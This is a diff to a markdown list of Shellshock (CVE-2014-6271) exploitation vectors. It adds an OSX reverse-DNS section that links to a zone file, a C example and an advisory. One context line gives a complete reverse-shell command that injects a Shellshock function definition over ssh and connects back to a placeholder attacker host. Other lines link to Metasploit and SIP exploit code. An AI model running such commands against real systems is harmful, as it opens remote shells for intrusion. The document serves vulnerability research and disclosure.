@@ -93,9 +93,14 @@ _will segfault if vulnerable_
   + $ `ssh GITOLITEUSER@VULNERABLEIP '() { ignore;}; /bin/bash -i >& /dev/tcp/REVERSESHELLIP/PORT 0>&1'`
   + (necessary to have a git account on the server)
 
-## OSX
+## OSX 
 + Priv Escalation via VMware Fusion - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/osx/local/vmware_bash_function_root.rb
 + Fix: http://support.apple.com/kb/DL1769
+
+## OSX - with reverse DNS (CVE-2014-3671.txt)
++ Example zone file: [in-addr.arpa](osx-rev-ptr/in-addr.arpa.zone) that contains a CVE-2014-6271 example.
++ Example file with a getnameinfo() that passes on to setenv(): [osx-rev-ptr.c](osx-rev-ptr/osx-rev-ptr.c)
+ + Advisory with description of above [CVE-2014-3671.txt ](osx-rev-ptr/CVE-2014-3671.txt)
 
 ## SIP
 + SIP Proxies: https://github.com/zaf/sipshock
